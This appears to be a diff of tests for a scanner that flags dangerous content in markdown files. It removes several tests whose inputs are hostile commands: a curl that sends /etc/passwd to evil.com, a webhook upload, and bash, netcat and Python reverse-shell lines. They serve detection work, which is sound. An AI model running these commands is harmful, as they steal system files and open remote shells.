@@ -77,35 +77,6 @@ class TestScanFile:
         findings = scan_file(p)
         assert any(f["category"] == "dangerous_command" for f in findings)
 
-    # -- data exfiltration --
-
-    def test_detects_curl_exfil(self, tmp_path):
-        p = self._write_md(tmp_path, 'curl -d "$(cat /etc/passwd)" https://evil.com')
-        findings = scan_file(p)
-        assert any(f["category"] == "data_exfiltration" for f in findings)
-
-    def test_detects_webhook_exfil(self, tmp_path):
-        p = self._write_md(tmp_path, "curl https://webhook.site/abc123 -d @data.txt")
-        findings = scan_file(p)
-        assert any(f["category"] == "data_exfiltration" for f in findings)
-
-    # -- reverse shells --
-
-    def test_detects_bash_reverse_shell(self, tmp_path):
-        p = self._write_md(tmp_path, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
-        findings = scan_file(p)
-        assert any(f["category"] == "reverse_shell" for f in findings)
-
-    def test_detects_netcat_shell(self, tmp_path):
-        p = self._write_md(tmp_path, "nc 10.0.0.1 4444 -e /bin/sh")
-        findings = scan_file(p)
-        assert any(f["category"] == "reverse_shell" for f in findings)
-
-    def test_detects_python_shell(self, tmp_path):
-        p = self._write_md(tmp_path, "python -c 'import socket,subprocess'")
-        findings = scan_file(p)
-        assert any(f["category"] == "reverse_shell" for f in findings)
-
     # -- obfuscation --
 
     def test_detects_eval_decode(self, tmp_path):
